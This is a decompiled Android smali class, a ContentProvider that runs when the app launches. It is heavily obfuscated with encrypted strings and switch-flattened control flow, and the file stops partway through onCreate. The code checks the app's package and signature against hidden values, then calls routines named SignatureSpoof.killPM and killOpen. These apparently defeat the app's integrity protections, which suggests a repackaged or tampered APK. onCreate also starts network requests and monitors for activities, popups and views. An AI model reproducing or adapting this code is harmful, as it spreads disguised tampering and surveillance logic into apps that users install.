.class public Lcom/zyyad/gamf/VWtPXZRcVTuEaEVjui;
.super Landroid/content/ContentProvider;


# direct methods
.method static constructor <clinit>()V
    .locals 5

    const-string v0, "MWhRDCN1CRQ=\n"

    const-string v1, "YRo+ekoRbGY=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    sget-object v1, Lcom/zyyad/gamf/kXEoVYTwnQIy;->SIGN:Ljava/lang/String;

    const/4 v0, 0x0

    :try_start_0
    invoke-static {v1, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    const v2, 0x6b3ba0d3

    const-string v0, "\u06e4\u06e7\u06e0\u06eb\u06e4\u06d8\u06d8\u06df\u06d8\u06e0\u06ec\u06db\u06e5\u06e6\u06eb\u06db\u06e2\u06eb\u06db\u06eb\u06d7\u06e7\u06e1\u06d7\u06df\u06df\u06d7\u06e2\u06d8\u06d9\u06e8"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v3, -0x647d0503

    const-string v0, "\u06dc\u06d6\u06d8\u06d8\u06e5\u06e2\u06e8\u06d8\u06d7\u06df\u06dc\u06d8\u06df\u06db\u06e6\u06d8\u06e4\u06e2\u06eb\u06d9\u06eb\u06d9\u06e1\u06e0\u06e5\u06e6\u06d7\u06d9\u06ec\u06e4\u06d9\u06e0\u06e5\u06e2\u06d9\u06eb\u06e0\u06e1\u06e8\u06e6\u06d8\u06e1\u06df\u06e2\u06d6\u06e7\u06da\u06e6\u06d6\u06d6\u06d8\u06d6\u06d6\u06e6\u06db\u06eb\u06e8\u06d8\u06e5\u06df\u06e0"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v0, "\u06d8\u06e2\u06da\u06dc\u06ec\u06e5\u06ec\u06e5\u06e0\u06e7\u06d7\u06d9\u06e5\u06e1\u06d6\u06e0\u06e6\u06e6\u06d7\u06db\u06e5\u06d8\u06e5\u06d8\u06e8\u06db\u06e0\u06e8\u06d8\u06da\u06e6\u06e8\u06e6\u06e8\u06e5\u06e5\u06e5\u06d8\u06d8"

    goto :goto_1

    :sswitch_2
    const-string v0, "\u06ec\u06e0\u06e0\u06d8\u06d6\u06e7\u06df\u06eb\u06e7\u06e8\u06d8\u06d8\u06e2\u06d7\u06d8\u06d6\u06d8\u06e6\u06d8\u06e1\u06e6\u06eb\u06d7\u06d7\u06e5\u06d9\u06e0\u06e7\u06da\u06d8\u06d8\u06e5\u06e8\u06e6\u06dc\u06e6\u06eb\u06e0\u06eb\u06e5\u06e4\u06e8\u06e0\u06e5\u06d8\u06d8"

    goto :goto_0

    :cond_0
    const-string v0, "\u06da\u06e7\u06d8\u06e5\u06d6\u06e4\u06da\u06eb\u06e2\u06ec\u06e4\u06da\u06e6\u06e0\u06d6\u06e0\u06e6\u06eb\u06e4\u06d8\u06dc\u06db\u06dc\u06e1\u06d9\u06e5\u06df\u06d8\u06e5\u06d8\u06df\u06d8\u06d6\u06d8\u06d7\u06e2\u06e5\u06d8\u06e6\u06d6\u06e8\u06d8\u06e6\u06db\u06dc\u06d8"

    goto :goto_1

    :sswitch_3
    const-string v0, "qbkyHoFxhEW3uT8=\n"

    const-string v4, "8ppiX8I6xQI=\n"

    invoke-static {v0, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v4, Lcom/zyyad/gamf/kXEoVYTwnQIy;->PACKAGE:Ljava/lang/String;

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "\u06e4\u06e8\u06d6\u06d7\u06e5\u06e6\u06d8\u06df\u06e2\u06e1\u06d8\u06d8\u06e4\u06dc\u06d8\u06d9\u06e5\u06e5\u06db\u06df\u06e8\u06d8\u06e0\u06e5\u06d7\u06e4\u06e0\u06d9\u06e6\u06dc\u06dc\u06d8\u06e4\u06d9\u06e5\u06e6\u06eb\u06d8\u06d7\u06e7\u06ec\u06e6\u06d7\u06df\u06e1\u06e1\u06dc\u06d8\u06d8\u06e0\u06e4\u06ec\u06e5\u06e1\u06d8\u06e5\u06eb\u06df\u06d8\u06e0\u06e1"

    goto :goto_1

    :sswitch_4
    const-string v0, "\u06eb\u06e2\u06db\u06d8\u06d6\u06db\u06d9\u06e6\u06e8\u06e4\u06d7\u06dc\u06d7\u06da\u06e1\u06d8\u06e2\u06e2\u06e7\u06d9\u06e6\u06e5\u06e0\u06d7\u06e1\u06ec\u06e7\u06e6\u06d8\u06d8\u06e6\u06ec\u06e8\u06ec\u06da\u06e1\u06d8"
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :sswitch_5
    const-string v0, "\u06e2\u06e5\u06e0\u06e6\u06ec\u06e0\u06db\u06e2\u06eb\u06db\u06dc\u06e1\u06dc\u06d6\u06da\u06d6\u06e0\u06e7\u06e1\u06e7\u06d8\u06da\u06e5\u06e0\u06dc\u06e5\u06e4\u06e8\u06df\u06df\u06df\u06e1\u06dc\u06d8\u06e8\u06d6\u06e7\u06d8"

    goto :goto_0

    :sswitch_6
    const v2, 0x18cc6447

    const-string v0, "\u06d7\u06ec\u06d8\u06e2\u06e5\u06d7\u06d9\u06e2\u06e0\u06e1\u06e6\u06eb\u06e0\u06e4\u06e5\u06e7\u06d8\u06e4\u06d8\u06e5\u06d7\u06e8\u06e0\u06e8\u06d6\u06eb\u06da\u06eb\u06e5\u06d6\u06d8\u06d8\u06d6\u06d7\u06d8\u06d6\u06dc\u06e8\u06d8\u06d9\u06d9\u06dc\u06d8\u06e6\u06d8\u06e7\u06d8\u06e1\u06d8\u06d6\u06d8\u06d7\u06e4\u06da\u06dc\u06da\u06d7"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2

    goto :goto_2

    :sswitch_7
    const v3, -0x5000d756

    const-string v0, "\u06e8\u06db\u06e8\u06e7\u06e5\u06e7\u06e1\u06eb\u06d9\u06d7\u06e1\u06d8\u06eb\u06e7\u06d6\u06e4\u06e2\u06d6\u06d8\u06d8\u06e7\u06e7\u06d9\u06db\u06e1\u06d8\u06e4\u06d7\u06e1\u06e5\u06eb\u06e6\u06d8\u06d6\u06e7\u06e6\u06eb\u06db\u06e5\u06e6\u06e6\u06d6\u06d8\u06eb\u06e2\u06d7\u06eb\u06db\u06e1\u06d8\u06ec\u06e0\u06dc"

    :goto_3
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_3

    goto :goto_3

    :sswitch_8
    const-string v0, "xQ/qvRpWsL0=\n"

    const-string v4, "niy59F0Yk+A=\n"

    invoke-static {v0, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "\u06e0\u06df\u06e4\u06df\u06da\u06e1\u06d8\u06e2\u06d6\u06d7\u06e0\u06e0\u06eb\u06e8\u06d8\u06e7\u06e1\u06e4\u06df\u06e5\u06ec\u06d8\u06d8\u06d9\u06e6\u06e8\u06ec\u06d7\u06e0\u06d9\u06e4\u06da\u06e7\u06e6\u06d8\u06e8\u06e0\u06eb\u06e8\u06e5\u06da\u06e1\u06df\u06db\u06d6\u06df\u06e6\u06d8\u06e6\u06ec\u06eb\u06d6\u06e5\u06e5\u06d8\u06db\u06e7\u06e8"

    goto :goto_3

    :sswitch_9
    const-string v0, "\u06dc\u06da\u06e4\u06e5\u06d9\u06e6\u06da\u06df\u06d8\u06d8\u06e6\u06d8\u06e2\u06e7\u06d7\u06d7\u06d8\u06ec\u06d9\u06e5\u06e4\u06db\u06db\u06d9\u06e1\u06d6\u06df\u06e8\u06d8\u06dc\u06ec\u06e6\u06e5\u06e8\u06e2\u06e8\u06eb\u06db\u06e2\u06e5\u06e8\u06d8\u06ec\u06e1\u06e7\u06d8"

    goto :goto_2

    :cond_1
    const-string v0, "\u06df\u06d9\u06dc\u06e2\u06d6\u06e1\u06db\u06dc\u06dc\u06dc\u06e5\u06dc\u06d8\u06e0\u06ec\u06df\u06d7\u06d8\u06d6\u06e6\u06eb\u06d8\u06d8\u06e8\u06d9\u06df\u06d7\u06d6\u06d8\u06e7\u06d8\u06d8\u06d8"

    goto :goto_3

    :sswitch_a
    const-string v0, "\u06da\u06e2\u06dc\u06e0\u06da\u06df\u06e4\u06d9\u06e5\u06d8\u06dc\u06e1\u06d6\u06d6\u06e7\u06e1\u06d8\u06e5\u06e6\u06d6\u06d8\u06d8\u06e2\u06e5\u06d8\u06e2\u06df\u06d6\u06d7\u06e0\u06e1\u06d8\u06e4\u06e8\u06e8\u06d8"

    goto :goto_3

    :sswitch_b
    const-string v0, "\u06e6\u06eb\u06e8\u06d8\u06e4\u06e2\u06da\u06d6\u06d6\u06ec\u06e8\u06e1\u06e1\u06d6\u06e7\u06d6\u06e8\u06e2\u06e0\u06e5\u06e6\u06dc\u06d8\u06da\u06e1\u06d7\u06ec\u06df\u06e7\u06d6\u06d8\u06e6\u06d8"

    goto :goto_2

    :sswitch_c
    const-string v0, "\u06d6\u06e4\u06e7\u06d6\u06da\u06d6\u06e5\u06eb\u06e6\u06d8\u06e8\u06d9\u06df\u06d7\u06e5\u06ec\u06e8\u06da\u06d8\u06d8\u06e7\u06dc\u06da\u06e0\u06e0\u06e4\u06e5\u06e8\u06df\u06d9\u06df\u06e7\u06e4\u06d9\u06d6\u06e8\u06dc\u06e1\u06d8"

    goto :goto_2

    :sswitch_d
    sget-object v0, Lcom/zyyad/gamf/kXEoVYTwnQIy;->PACKAGE:Ljava/lang/String;

    invoke-static {v0, v1}, Lapi/repository/SignatureSpoof;->killPM(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/zyyad/gamf/kXEoVYTwnQIy;->PACKAGE:Ljava/lang/String;

    invoke-static {v0}, Lnatives/cn/shell/killPath;->killOpen(Ljava/lang/String;)V

    :sswitch_e
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    const-string v2, "Q37ErOjKWeaiB6KajZppg0W2rJ2/l1aP/jb31b39L5+GcPil7s5KQHnlLgY1UiCVuHD4penVZeSG\nBg==\n"

    const-string v3, "GJZLMAFyxgI=\n"

    invoke-static {v2, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v1

    nop

    :sswitch_data_0
    .sparse-switch
        -0x78638119 -> :sswitch_5
        -0x5a8d07b4 -> :sswitch_e
        -0x34492e41 -> :sswitch_0
        -0x2d2fba70 -> :sswitch_6
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x7e1092bf -> :sswitch_2
        -0x42988c88 -> :sswitch_1
        -0x42635d10 -> :sswitch_3
        0x68c678d0 -> :sswitch_4
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x40c897bb -> :sswitch_7
        -0x12c83474 -> :sswitch_e
        0x353fc37e -> :sswitch_c
        0x65a00312 -> :sswitch_d
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x24130ab -> :sswitch_8
        0x5710b7b2 -> :sswitch_9
        0x5c8538a7 -> :sswitch_b
        0x6e9f4d5e -> :sswitch_a
    .end sparse-switch
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/ContentProvider;-><init>()V

    return-void
.end method


# virtual methods
.method public final delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 4

    const-string v0, "\u06eb\u06d9\u06d9\u06e2\u06e0\u06df\u06e6\u06e2\u06e4\u06eb\u06e6\u06d9\u06e7\u06e6\u06e8\u06df\u06df\u06e6\u06d8\u06e4\u06e5\u06d9\u06e6\u06e6\u06e5\u06e1\u06e7\u06ec\u06d7\u06e7\u06e4\u06e0\u06e6\u06d8\u06eb\u06d9\u06e1\u06e0\u06da\u06e4\u06e4\u06df\u06d8\u06db\u06d7\u06e7\u06db\u06da\u06e2"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x347

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x3a3

    const/16 v2, 0x308

    const v3, -0x1d5c3d40

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06dc\u06e6\u06e1\u06db\u06d7\u06e8\u06d8\u06d6\u06e1\u06dc\u06db\u06e8\u06e6\u06e0\u06e5\u06d8\u06d6\u06df\u06e7\u06e6\u06db\u06ec\u06dc\u06db\u06d9\u06e6\u06e2\u06e0\u06e7\u06e8\u06e5\u06e0\u06d8\u06d8\u06e8\u06d9\u06e1\u06d6\u06dc\u06d8\u06d8\u06da\u06e8\u06e8\u06d8"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06d8\u06eb\u06e1\u06d8\u06da\u06d7\u06e7\u06dc\u06d9\u06e7\u06df\u06d6\u06df\u06eb\u06d8\u06e8\u06e1\u06e2\u06e7\u06e1\u06da\u06e1\u06d8\u06d8\u06e0\u06d9\u06e8\u06e8\u06e4\u06d7\u06d7\u06e5\u06e7\u06db\u06e1\u06da\u06e1\u06da\u06d8\u06d7\u06ec\u06db\u06d6\u06e1\u06d8"

    goto :goto_0

    :sswitch_2
    const-string v0, "\u06da\u06e4\u06e6\u06d9\u06e2\u06df\u06e4\u06d9\u06e7\u06e6\u06e0\u06e2\u06e2\u06e7\u06da\u06d9\u06e1\u06ec\u06ec\u06e5\u06e7\u06dc\u06e7\u06da\u06ec\u06eb\u06e2\u06e1\u06d8\u06d8\u06e7\u06e6\u06e1\u06eb\u06eb\u06d6\u06e8\u06eb\u06d8\u06d9\u06e0\u06e6\u06d9\u06e2\u06e0\u06e4\u06e7\u06dc\u06d8"

    goto :goto_0

    :sswitch_3
    const-string v0, "\u06d8\u06e0\u06df\u06d8\u06da\u06d6\u06d8\u06eb\u06d7\u06e8\u06d8\u06da\u06e1\u06e6\u06db\u06dc\u06e7\u06d8\u06eb\u06db\u06e8\u06d8\u06e1\u06db\u06e8\u06d8\u06da\u06e7\u06d8\u06d8\u06e0\u06db\u06eb\u06e7\u06e0\u06e8\u06dc\u06da\u06db\u06e1\u06dc\u06db\u06df\u06eb\u06e4\u06e6\u06d8"

    goto :goto_0

    :sswitch_4
    const/4 v0, 0x0

    return v0

    :sswitch_data_0
    .sparse-switch
        -0x6ef77ea5 -> :sswitch_4
        -0x43300594 -> :sswitch_2
        0x52b28276 -> :sswitch_3
        0x5a242c21 -> :sswitch_1
        0x7ab6999a -> :sswitch_0
    .end sparse-switch
.end method

.method public final getType(Landroid/net/Uri;)Ljava/lang/String;
    .locals 4

    const-string v0, "\u06db\u06e5\u06e7\u06d8\u06e1\u06d9\u06eb\u06e6\u06d6\u06d9\u06e4\u06da\u06e8\u06d8\u06ec\u06e5\u06da\u06e1\u06e8\u06d6\u06d8\u06d6\u06e6\u06e7\u06db\u06e5\u06d9\u06e4\u06e8\u06e4\u06dc\u06d7\u06d6\u06d8\u06e7\u06d6\u06dc\u06e0\u06e7\u06e8\u06d8\u06e0\u06ec\u06e6\u06d8\u06e8\u06d9\u06e0\u06d9\u06d6\u06d8\u06ec\u06d7\u06df\u06e2\u06df\u06e6\u06e0\u06d8\u06ec"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x283

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x2f1

    const/16 v2, 0x58

    const v3, -0x2d4ad69b

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06e7\u06eb\u06d9\u06d7\u06da\u06d6\u06da\u06e0\u06e8\u06d8\u06e4\u06e0\u06d9\u06d9\u06eb\u06e8\u06df\u06e8\u06e0\u06e0\u06da\u06ec\u06df\u06d9\u06e5\u06d8\u06e0\u06e1\u06da\u06e1\u06e8\u06e4\u06e5\u06e1\u06df\u06e0\u06df\u06d9\u06e5\u06eb\u06e1\u06df\u06e6\u06d8\u06e8\u06db\u06e8\u06e2\u06e8\u06d6"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06d7\u06e5\u06d9\u06ec\u06e7\u06d6\u06dc\u06eb\u06e8\u06eb\u06df\u06d8\u06d8\u06e5\u06e4\u06e0\u06e0\u06e7\u06e2\u06e2\u06ec\u06e8\u06d8\u06d6\u06e4\u06e2\u06d9\u06e6\u06d8\u06da\u06dc\u06e0\u06d8\u06ec\u06e5\u06e4\u06e4\u06d9"

    goto :goto_0

    :sswitch_2
    const/4 v0, 0x0

    return-object v0

    :sswitch_data_0
    .sparse-switch
        -0x34a666d4 -> :sswitch_0
        -0x1b27ce8f -> :sswitch_2
        -0x1aa1b1f2 -> :sswitch_1
    .end sparse-switch
.end method

.method public final insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .locals 4

    const-string v0, "\u06ec\u06e5\u06dc\u06d8\u06d8\u06d9\u06e6\u06d8\u06e0\u06eb\u06df\u06d8\u06e2\u06dc\u06dc\u06dc\u06d8\u06eb\u06e7\u06e6\u06d8\u06d9\u06db\u06d8\u06e6\u06d7\u06e5\u06d8\u06d9\u06ec\u06e6\u06e1\u06d7\u06dc\u06d8\u06e4\u06da\u06d6\u06d6\u06da\u06e6\u06e7\u06d6\u06d8\u06e6\u06ec\u06e4"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x205

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x336

    const/16 v2, 0x19e

    const v3, -0x5faa818

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06e6\u06d9\u06e7\u06ec\u06df\u06e6\u06d8\u06eb\u06dc\u06e5\u06e4\u06e8\u06e5\u06d8\u06e0\u06d9\u06e0\u06e5\u06e0\u06d7\u06e2\u06e0\u06dc\u06d8\u06e4\u06e6\u06dc\u06d8\u06dc\u06d7\u06e6\u06d8\u06e2\u06e8\u06d6\u06d9\u06e6\u06eb\u06d8\u06d9\u06e4\u06e4\u06e0\u06e5\u06d8\u06e8\u06d9\u06e1\u06d8\u06d9\u06dc\u06e5\u06e0\u06d6\u06e6\u06e2\u06e0\u06da\u06d9\u06dc\u06eb"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06ec\u06d8\u06da\u06e0\u06d6\u06e0\u06da\u06d6\u06db\u06d9\u06df\u06dc\u06d8\u06d7\u06ec\u06e2\u06dc\u06d6\u06e6\u06db\u06e1\u06e2\u06e5\u06e5\u06d7\u06d6\u06e1\u06e5\u06dc\u06dc\u06d8\u06e5\u06eb\u06e2\u06d7\u06d9\u06db\u06ec\u06e4\u06da\u06e0\u06e5\u06e4\u06e8\u06e6\u06d8\u06d8\u06e5\u06e7"

    goto :goto_0

    :sswitch_2
    const-string v0, "\u06e0\u06eb\u06e6\u06d8\u06e2\u06e7\u06d8\u06d6\u06d6\u06e2\u06e7\u06e2\u06e0\u06d8\u06ec\u06dc\u06d8\u06d9\u06e7\u06e7\u06dc\u06eb\u06d6\u06d8\u06e7\u06e7\u06e0\u06dc\u06eb\u06d7\u06ec\u06ec\u06e5\u06e1\u06e8\u06e6\u06d8\u06e7\u06eb\u06d6\u06d8"

    goto :goto_0

    :sswitch_3
    const/4 v0, 0x0

    return-object v0

    nop

    :sswitch_data_0
    .sparse-switch
        0x2595019e -> :sswitch_3
        0x31c6545f -> :sswitch_1
        0x3d3fc052 -> :sswitch_2
        0x729627a7 -> :sswitch_0
    .end sparse-switch
.end method

.method public final onCreate()Z
    .locals 8

    const/4 v3, 0x1

    const/4 v2, 0x0

    invoke-virtual {p0}, Landroid/content/ContentProvider;->getContext()Landroid/content/Context;

    move-result-object v1

    const v4, 0x711d112d

    const-string v0, "\u06df\u06e0\u06d8\u06e1\u06ec\u06e5\u06d8\u06d9\u06e1\u06d8\u06d7\u06e7\u06eb\u06e0\u06eb\u06d6\u06d8\u06e7\u06d7\u06e7\u06df\u06e4\u06d7\u06e0\u06d9\u06e1\u06db\u06e0\u06eb\u06ec\u06d8\u06d6\u06dc\u06d9\u06da\u06e0\u06e7\u06d6\u06ec\u06d7\u06df\u06da\u06db\u06e8\u06d8\u06d9\u06d6\u06e5\u06d8\u06d6\u06e1\u06ec\u06d8\u06ec\u06e2\u06df\u06e2\u06d9"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v5, -0x2d8a9400

    const-string v0, "\u06e5\u06dc\u06e7\u06da\u06d8\u06d8\u06e0\u06d9\u06d6\u06e5\u06ec\u06e7\u06e5\u06e1\u06e0\u06e4\u06e0\u06e8\u06da\u06e6\u06e5\u06e0\u06d6\u06d8\u06eb\u06d9\u06e7\u06ec\u06da\u06db\u06eb\u06e7\u06eb\u06e0\u06e1\u06e5\u06d8\u06e2\u06d6\u06d8\u06d8\u06ec\u06e8\u06d6\u06d8\u06e7\u06eb\u06e2\u06d7\u06ec"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v0, "\u06e2\u06ec\u06e6\u06d8\u06eb\u06ec\u06e8\u06d8\u06da\u06d6\u06eb\u06e0\u06d8\u06d7\u06e1\u06e0\u06da\u06d9\u06e1\u06df\u06d8\u06eb\u06ec\u06dc\u06e0\u06df\u06ec\u06db\u06e8\u06e7\u06d8\u06e8\u06e7\u06e8\u06df\u06e4\u06d6\u06d8"

    goto :goto_1

    :sswitch_2
    const-string v0, "\u06df\u06e7\u06e6\u06dc\u06d9\u06dc\u06d8\u06e5\u06db\u06d6\u06d8\u06e0\u06eb\u06d6\u06d8\u06df\u06e6\u06d8\u06e5\u06eb\u06ec\u06e7\u06e5\u06e6\u06d8\u06e7\u06e2\u06e8\u06d8\u06da\u06d6\u06e4\u06da\u06e4\u06e4\u06e6\u06dc\u06d8\u06d8\u06df\u06e7\u06da\u06eb\u06d6\u06e6\u06d8\u06e0\u06e8\u06e0\u06ec\u06db\u06ec\u06da\u06db\u06eb"

    goto :goto_0

    :cond_0
    const-string v0, "\u06db\u06dc\u06dc\u06d8\u06d7\u06e6\u06e8\u06d8\u06e6\u06da\u06d8\u06d8\u06e8\u06df\u06e2\u06d9\u06d6\u06da\u06d6\u06da\u06df\u06e8\u06e7\u06ec\u06e8\u06e4\u06d8\u06d8\u06e0\u06df\u06d6\u06d8\u06df\u06e6\u06e1\u06d8\u06e1\u06df\u06df\u06d6\u06e0\u06d8\u06d8\u06d7\u06df\u06e1\u06d8\u06db\u06e7\u06e8\u06e0\u06d9\u06ec\u06da\u06e0\u06eb\u06e5\u06e8\u06ec\u06d9"

    goto :goto_1

    :sswitch_3
    if-nez v1, :cond_0

    const-string v0, "\u06df\u06e5\u06e4\u06df\u06db\u06d6\u06e1\u06da\u06d8\u06d7\u06e2\u06dc\u06d8\u06d6\u06db\u06d6\u06d8\u06e1\u06e8\u06df\u06e6\u06ec\u06e5\u06e5\u06dc\u06d8\u06df\u06e2\u06e8\u06d7\u06d9\u06df"

    goto :goto_1

    :sswitch_4
    const-string v0, "\u06e5\u06dc\u06e7\u06d9\u06e5\u06db\u06e5\u06e0\u06e4\u06e2\u06d9\u06db\u06e5\u06e1\u06d9\u06e6\u06d6\u06d7\u06e5\u06d8\u06e6\u06e6\u06e6\u06e8\u06df\u06d7\u06e6\u06d8\u06e6\u06e8\u06e4\u06d9\u06e6\u06d7\u06ec\u06df\u06d9\u06d9\u06d6\u06e7\u06d8\u06e4\u06e8\u06e0\u06eb\u06d8\u06e1\u06e1\u06dc\u06e6\u06d7\u06e8\u06e5\u06d8"

    goto :goto_0

    :sswitch_5
    const-string v0, "\u06e4\u06eb\u06e5\u06d6\u06d8\u06e6\u06dc\u06ec\u06ec\u06e6\u06eb\u06e6\u06d8\u06ec\u06e4\u06e2\u06df\u06d8\u06e8\u06e6\u06e0\u06e5\u06d8\u06d7\u06e1\u06e5\u06d6\u06e1\u06d8\u06e4\u06e1\u06eb\u06e0\u06e6\u06d6\u06d8\u06e8\u06d7\u06d8\u06db\u06e8\u06e8\u06d9\u06e4\u06e2"

    goto :goto_0

    :sswitch_6
    move v0, v2

    :goto_2
    return v0

    :sswitch_7
    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    check-cast v0, Landroid/app/Application;

    invoke-virtual {v0}, Landroid/content/ContextWrapper;->getBaseContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v0}, Lcom/zyyad/gamf/UgxfpdsWPJtvNIp;->setShellContextThis(Landroid/content/Context;)V

    invoke-static {v4}, Lcom/zyyad/gamf/UgxfpdsWPJtvNIp;->setShellContext(Landroid/content/Context;)V

    const v5, -0x2d222f5e

    const-string v1, "\u06e0\u06e7\u06d6\u06d8\u06eb\u06dc\u06df\u06ec\u06da\u06e1\u06e4\u06e6\u06e5\u06d8\u06eb\u06e5\u06dc\u06e6\u06e2\u06e7\u06e4\u06d9\u06ec\u06e1\u06d9\u06d9\u06e4\u06e4\u06e2\u06db\u06e7\u06e4\u06d6\u06e0\u06e5\u06e7\u06d8\u06e5\u06d8\u06eb\u06e5\u06dc\u06d8\u06d6\u06e5\u06e7\u06da\u06d6\u06e1\u06e6\u06e6\u06d8"

    :goto_3
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_2

    goto :goto_3

    :sswitch_8
    :try_start_0
    invoke-static {v4}, Landroidx/multidex/MultiDex;->install(Landroid/content/Context;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :goto_4
    invoke-static {v4, v2}, LCu7y/sdk/e5;->startRequest(Landroid/content/Context;Z)V

    invoke-static {v4}, LCu7y/sdk/e5;->offline(Landroid/content/Context;)V

    invoke-static {v4}, Lapi/repository/Utils;->startActivityMonitor(Landroid/content/Context;)V

    invoke-static {v4}, Lapi/repository/Utils;->startPopupMonitor(Landroid/content/Context;)V

    invoke-static {v4}, Lapi/repository/Utils;->startViewMonitor(Landroid/content/Context;)V

    const-string v1, "tMOEBCLG\n"

    const-string v2, "16zqYkuh+pQ=\n"

    invoke-static {v1, v2}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lapi/repository/Utils;->shellSP_read(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const v4, -0x1945f93b

    const-string v1, "\u06d6\u06e1\u06e8\u06d8\u06e5\u06db\u06e6\u06d8\u06e5\u06e5\u06d6\u06d9\u06d7\u06e8\u06eb\u06d6\u06dc\u06d6\u06db\u06e2\u06d9\u06e8\u06d9\u06eb\u06d7\u06d9\u06eb\u06d6\u06e0\u06dc\u06e0\u06e6\u06e8\u06db\u06e5\u06e2\u06e4\u06dc\u06e1\u06d6\u06d8\u06d8\u06e6\u06dc\u06e6\u06d8\u06dc\u06d8\u06d8\u06d8\u06df\u06eb\u06e5\u06e6\u06e0\u06dc\u06e7\u06d8\u06d8"

    :goto_5
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_3

    goto :goto_5

    :sswitch_9
    const-string v1, "\u06e0\u06eb\u06da\u06db\u06e4\u06da\u06d9\u06d8\u06e2\u06e5\u06e2\u06e2\u06e6\u06e4\u06d8\u06d8\u06e6\u06d8\u06df\u06d8\u06d9\u06e5\u06d8\u06da\u06df\u06e4\u06e5\u06ec\u06e1\u06da\u06e1\u06dc\u06d7\u06e7\u06ec\u06e1\u06da\u06db"

    goto :goto_5

    :sswitch_a
    const-string v1, "\u06d6\u06e4\u06da\u06dc\u06eb\u06d6\u06dc\u06e6\u06eb\u06e4\u06d8\u06d8\u06d8\u06e5\u06df\u06e6\u06dc\u06e1\u06e2\u06dc\u06e5\u06d8\u06e5\u06da\u06d6\u06df\u06d7\u06d7\u06e1\u06d8\u06dc\u06d6\u06e1\u06e8\u06d8\u06df\u06d8"

    goto :goto_3

    :sswitch_b
    const v6, -0x5d6c5313

